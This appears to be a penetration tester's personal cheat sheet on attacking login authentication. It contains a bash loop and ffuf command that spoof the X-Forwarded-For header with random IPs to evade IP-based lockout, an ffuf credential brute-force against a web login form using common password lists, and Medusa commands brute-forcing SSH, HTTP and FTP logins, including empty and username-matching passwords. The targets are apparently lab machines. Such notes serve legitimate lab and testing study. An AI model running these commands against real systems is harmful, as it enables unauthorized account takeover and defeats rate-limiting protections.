#auth 
##### Bypass protection
1. Use header
```bash
for i in {1..10000}; do echo "$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256)).$((RANDOM % 256))"; done > random_ips.txt
```

```bash
ffuf -w random_ips.txt:IP -H 'X-Forwareded-For: IP'
```
1. IP block may be reset on success login or request counter may be reset
2. Account lock after a number of fail attempts
3. captcha
#### Basic usage
````shell
ffuf -w valid_usernames.txt:W1,/usr/share/wordlists/SecLists/Passwords/Common-Credentials/10-million-password-list-top-100.txt:W2 -X POST -d "username=W1&password=W2" -H "Content-Type: application/x-www-form-urlencoded" -u http://MACHINE_IP/customers/login -fc 200
````
#### Medusa
```shell
 medusa -h 192.168.0.100 -U usernames.txt -P passwords.txt -M ssh 
```

```shell-session
medusa -H web_servers.txt -U usernames.txt -P passwords.txt -M http -m GET 
```

 Perform additional checks for empty passwords (`-e n`) and passwords matching the username (`-e s`).
```shell
medusa -h 10.0.0.5 -U usernames.txt -e ns -M service_name
```
[[FTP]]:
```
medusa -u fiona -P /usr/share/wordlists/rockyou.txt -h 10.129.203.7 -M ftp
```